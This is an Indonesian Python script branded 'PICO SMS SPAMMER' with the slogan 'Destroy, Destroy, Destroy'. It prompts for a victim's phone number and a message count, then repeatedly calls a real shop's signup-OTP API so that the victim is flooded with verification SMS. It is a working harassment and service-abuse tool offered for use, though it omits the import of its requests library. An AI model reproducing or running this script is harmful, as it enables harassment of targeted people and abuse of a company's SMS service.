#!/bin/python

# import module
import os
import sys
import time

# mengetik otomatis
def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
        
# isi utama
os.system("clear")
print('+===============================================+')
print('{+} Author   : Danendra')
print('{+} Cyber Id : PicoXploit')
print('{+} Slogan   : Destroy , Destroy , Destroy')
print('+===============================================+')
mengetik("PICO SMS SPAMMER")
mengetik("Serang Target Sampai Minta Ampun!")
mengetik("maked with \U0001F49A by : ~pico ")


no = int(input('masukan no target nya brow : '))
jum = int(input('masukan jumlah pesan : '))

json = {'phone' :no}
jumlahpes = 0
for res in range(jum):
    res = requests.post('https://cmsapi.mapclub.com/api/signup-otp',json=json)
    if "ok" in res.text :
        jumlahpes +=1
        print(jumlahpes, 'berhasil terhantam brow')        
    else:       
        print('error brow , coba lagi deh ===> ', res.text)
